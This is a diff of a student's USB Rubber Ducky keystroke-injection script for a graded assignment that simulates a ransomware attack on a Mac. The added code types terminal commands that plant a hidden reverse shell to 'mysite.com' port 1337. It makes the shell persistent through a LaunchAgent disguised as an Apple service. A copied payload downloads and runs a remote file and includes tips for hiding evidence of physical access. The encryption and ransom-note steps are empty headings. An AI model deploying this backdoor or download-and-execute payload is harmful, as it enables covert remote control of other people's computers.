@@ -1,28 +1,181 @@
-duckyscript.txt
+REM duckyscript.txt
 
-# Anthony Wittemann
-
-#	[5 points] Install a meterpreter backdoor (persistence) into the target system, without being detected by any anti-virus software
+REM Anthony Wittemann
 
 
-#	[5 points] Download and install GPG
-
-
-#	[5 points] Generate a GPG key using the password “OMGWTFBBQChicken” without the quotes
-
-
-#	[5 points] Encrypt the current users home directory using the previous GPG keys. This means everything within it.
-
-
-#	[5 points] Export the public/private key from GPG onto a USB, and securely delete the GPG key from the system’s keychain
-
-
-#	[5 points] Install an addon for the default browser of the system.
-
-
-#	[5 points] Leave an unencrypted ransom note on the current user’s desktop. For bonus lulz, leave a meme.
+REM --------------------------------------------------------
+REM Wait for OS to recognize ducky as keyboard & start run box
+REM --------------------------------------------------------
+DELAY 3000
+GUI r
+DELAY 200
 
 
 
-#   [10 points] Comments within the entire script, that explain what each section of the script is doing and how it is doing it
+
+REM	[5 points] Install a meterpreter backdoor (persistence) into the target system, without being detected by any anti-virus software
+REM Reference: http://patrickmosca.com/root-a-mac-in-10-seconds-or-less/
+
+
+REM Change mysite.com to your domain name or IP address
+REM Change 1337 to your port number
+REM Catch the shell with 'nc -l -p 1337'
+REM http://patrickmosca.com/root-a-mac-in-10-seconds-or-less/
+DELAY 1000
+GUI SPACE
+STRING terminal
+DELAY 500
+ENTER
+DELAY 500
+STRING mkdir ~/Library/.hidden
+ENTER
+DELAY 200
+STRING echo '#!/bin/bash
+ENTER
+STRING bash -i >& /dev/tcp/mysite.com/1337 0>&1
+ENTER
+STRING wait' > ~/Library/.hidden/connect.sh
+ENTER
+DELAY 500
+STRING chmod +x ~/Library/.hidden/connect.sh
+ENTER
+DELAY 200
+STRING mkdir ~/Library/LaunchAgents
+ENTER
+DELAY 200
+STRING echo '<plist version="1.0">
+ENTER
+STRING <dict>
+ENTER
+STRING <key>Label</key>
+ENTER
+STRING <string>com.apples.services</string>
+ENTER
+STRING <key>ProgramArguments</key>
+ENTER
+STRING <array>
+ENTER
+STRING <string>/bin/sh</string>
+ENTER
+STRING <string>'$HOME'/Library/.hidden/connect.sh</string>
+ENTER
+STRING </array>
+ENTER
+STRING <key>RunAtLoad</key>
+ENTER
+STRING <true/>
+ENTER
+STRING <key>StartInterval</key>
+ENTER
+STRING <integer>60</integer>
+ENTER
+STRING <key>AbandonProcessGroup</key>
+ENTER
+STRING <true/>
+ENTER
+STRING </dict>
+ENTER
+STRING </plist>' > ~/Library/LaunchAgents/com.apples.services.plist
+ENTER
+DELAY 200
+STRING chmod 600 ~/Library/LaunchAgents/com.apples.services.plist
+ENTER
+DELAY 200
+STRING launchctl load ~/Library/LaunchAgents/com.apples.services.plist
+ENTER
+DELAY 200
+
+
+
+
+
+REM --------------------------------------------------------
+REM	[5 points] Download and install GPG
+REM Reference: https://github.com/hak5darren/USB-Rubber-Ducky/wiki/Payload---OS-X-Wget-and-Execute
+REM --------------------------------------------------------
+
+REM Title: OS X Wget and Execute
+REM Author: Jesse Wallace (c0deous)
+REM Simple script that downloads any file and runs it. 
+REM Requires duckencoder 2.6.3 which can be downloaded at http://goo.gl/QkTXNp
+REM Note: you must put in your own specific code to execute
+
+DELAY 1000
+COMMAND SPACE
+DELAY 800
+STRING Terminal
+DELAY 500
+ENTER
+DELAY 500
+STRING curl http://SERVER/path/to/file > file
+ENTER
+DELAY 1000
+STRING INSERT COMMAND TO EXECUTE HERE
+ENTER
+REM You can chage the above line to the command used to open your program.
+
+REM Examples: python somescript.py , ./somescript.sh
+
+REM Note: This script doesn't delete the downloaded file so it may leave evidence of physical access.  Delete it as quickly as possible after this runs.
+REM Or alternatively you could hide it somewhere in a hidden folder where it won't be easily found.
+
+
+
+
+
+
+
+
+REM --------------------------------------------------------
+REM	[5 points] Generate a GPG key using the password “OMGWTFBBQChicken” without the quotes
+REM --------------------------------------------------------
+
+
+
+
+
+
+REM --------------------------------------------------------
+REM	[5 points] Encrypt the current users home directory using the previous GPG keys. This means everything within it.
+REM --------------------------------------------------------
+
+
+
+
+
+
+
+REM --------------------------------------------------------
+REM	[5 points] Export the public/private key from GPG onto a USB, and securely delete the GPG key from the system’s keychain
+REM --------------------------------------------------------
+
+
+
+
+
+
+
+
+REM --------------------------------------------------------
+REM	[5 points] Install an addon for the default browser of the system.
+REM --------------------------------------------------------
+
+
+
+
+
+
+
+
+
+REM --------------------------------------------------------
+REM	[5 points] Leave an unencrypted ransom note on the current user’s desktop. For bonus lulz, leave a meme.
+REM --------------------------------------------------------
+
+
+
+
+
+
+REM   [10 points] Comments within the entire script, that explain what each section of the script is doing and how it is doing it
 
